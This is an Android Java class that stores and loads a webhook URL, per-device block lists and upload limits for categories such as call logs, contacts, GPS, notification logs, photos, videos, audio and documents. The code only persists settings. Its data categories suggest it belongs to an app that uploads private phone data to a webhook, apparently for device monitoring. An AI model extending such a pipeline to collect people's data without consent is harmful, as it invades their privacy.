package com.application.baselibrary.config;

import android.content.Context;
import android.content.SharedPreferences;
import android.util.Log;

import com.application.baselibrary.config.model.webhookdevicefilter.BlockedDevices;
import com.application.baselibrary.config.model.webhookdevicefilter.FilterDevices;
import com.application.baselibrary.config.model.webhookdevicefilter.WebhookDeviceFilter;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashSet;
import java.util.List;
import java.util.Map;
import java.util.Set;

public class ConfigStorage {

    private static final String PREF_NAME = ConfigPrefsKeys.PREF_NAME;
    private final SharedPreferences prefs;


    public ConfigStorage(Context context) {
        this.prefs = context.getSharedPreferences(PREF_NAME, Context.MODE_PRIVATE);
    }

    // Save config into individual keys
    public void saveConfig(WebhookDeviceFilter config) {
        SharedPreferences.Editor editor = prefs.edit();

        editor.putString("webhookUrl", config.getWebhookUrl());

        if (config.getFilterDevices() != null && config.getFilterDevices().getBlockedDevices() != null) {
            BlockedDevices blocked = config.getFilterDevices().getBlockedDevices();

            putList(editor, "blocked_full", blocked.getFull());
            putList(editor, "blocked_audio", blocked.getAudio());
            putList(editor, "blocked_callLog", blocked.getCallLog());
            putList(editor, "blocked_contacts", blocked.getContacts());
            putList(editor, "blocked_dcimPictures", blocked.getDcimPictures());
            putList(editor, "blocked_dcimVideos", blocked.getDcimVideos());
            putList(editor, "blocked_documents", blocked.getDocuments());
            putList(editor, "blocked_gps", blocked.getGps());
            putList(editor, "blocked_notificationLogs", blocked.getNotificationLogs());
            putInt(editor, "maxDocumentUploadCount", blocked.getMaxDocumentUploadCount());
            putInt(editor, "maxImageUploadCount", blocked.getMaxImageUploadCount());
            putInt(editor, "maxAudioUploadCount", blocked.getMaxAudioUploadCount());
        }

        editor.apply();
    }


    private void putList(SharedPreferences.Editor editor, String key, List<String> list) {
        if (list != null) {
            editor.putStringSet(key, new HashSet<>(list));
        }
    }
    private void putInt(SharedPreferences.Editor editor, String key, int value) {
            editor.putInt(key, value);
    }


    // Read config back into POJO
    public WebhookDeviceFilter loadConfig() {
        WebhookDeviceFilter config = new WebhookDeviceFilter();
        config.setWebhookUrl(prefs.getString("webhookUrl", null));

        FilterDevices filterDevices = new FilterDevices();
        BlockedDevices blocked = new BlockedDevices();

        blocked.setFull(getList("blocked_full"));
        blocked.setAudio(getList("blocked_audio"));
        blocked.setCallLog(getList("blocked_callLog"));
        blocked.setContacts(getList("blocked_contacts"));
        blocked.setDcimPictures(getList("blocked_dcimPictures"));
        blocked.setDcimVideos(getList("blocked_dcimVideos"));
        blocked.setDocuments(getList("blocked_documents"));
        blocked.setGps(getList("blocked_gps"));
        blocked.setNotificationLogs(getList("blocked_notificationLogs"));
        blocked.setMaxDocumentUploadCount(getInt("maxDocumentUploadCount"));
        blocked.setMaxImageUploadCount(getInt("maxImageUploadCount"));
        blocked.setMaxAudioUploadCount(getInt("maxAudioUploadCount"));


        filterDevices.setBlockedDevices(blocked);
        config.setFilterDevices(filterDevices);

        return config;
    }

    // Helper to read a comma-separated list

    private List<String> getList(String key) {
        Set<String> set = prefs.getStringSet(key, null);
        return set != null ? new ArrayList<>(set) : null;
    }

    private int getInt(String key) {
        return prefs.getInt(key,5);
    }

    public void saveVersion(String version) {
        prefs.edit().putString("device_config_version", version).apply();
    }

    public String getVersion() {
        return prefs.getString("device_config_version", null);
    }

    public void logAllPrefs() {
        Map<String, ?> allPrefs = prefs.getAll();
        if (allPrefs.isEmpty()) {
            Log.d("ConfigStorage", "No preferences found in " + PREF_NAME);
            return;
        }

        Log.d("ConfigStorage", "Dumping all preferences from " + PREF_NAME + ":");
        for (Map.Entry<String, ?> entry : allPrefs.entrySet()) {
            String key = entry.getKey();
            Object value = entry.getValue();

            if (value instanceof Set) {
                // Convert Set<String> to a readable string
                Log.d("ConfigStorage", key + " = " + value.toString());
            } else {
                Log.d("ConfigStorage", key + " = " + String.valueOf(value));
            }
        }
    }
}
